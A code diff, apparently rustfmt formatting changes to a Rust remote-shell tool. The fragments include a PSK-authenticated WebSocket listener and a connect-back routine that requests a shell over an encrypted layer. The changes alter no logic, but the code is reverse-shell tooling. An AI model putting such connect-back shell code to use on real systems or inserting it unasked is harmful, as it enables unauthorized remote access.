@@ -121,10 +121,7 @@ impl<S: AsyncRead + AsyncWrite + Unpin> AsyncWrite for WsByteStream<S> {
         }
     }
 
-    fn poll_shutdown(
-        mut self: Pin<&mut Self>,
-        cx: &mut Context<'_>,
-    ) -> Poll<std::io::Result<()>> {
+    fn poll_shutdown(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
         match self.ws.poll_close_unpin(cx) {
             Poll::Ready(Ok(())) => Poll::Ready(Ok(())),
             Poll::Ready(Err(e)) => {
@@ -155,9 +152,10 @@ pub async fn run_ws_listener(port: u16, psk: &str) -> TshResult<()> {
     let psk = psk.to_string();
 
     loop {
-        let (tcp_stream, peer) = listener.accept().await.map_err(|e| {
-            TshError::network(format!("Failed to accept connection: {e}"))
-        })?;
+        let (tcp_stream, peer) = listener
+            .accept()
+            .await
+            .map_err(|e| TshError::network(format!("Failed to accept connection: {e}")))?;
 
         let psk = psk.clone();
         tokio::spawn(async move {
@@ -221,10 +219,7 @@ pub async fn run_ws_connect_back(url: &str, port: u16, delay: u64, psk: &str) ->
 
                         // Send RunShell mode
                         use crate::{constants::OperationMode, helpers::NoiseLayerExt};
-                        if let Err(e) = layer
-                            .write_all(&[OperationMode::RunShell as u8])
-                            .await
-                        {
+                        if let Err(e) = layer.write_all(&[OperationMode::RunShell as u8]).await {
                             error!("Failed to send operation mode: {e}");
                             continue;
                         }
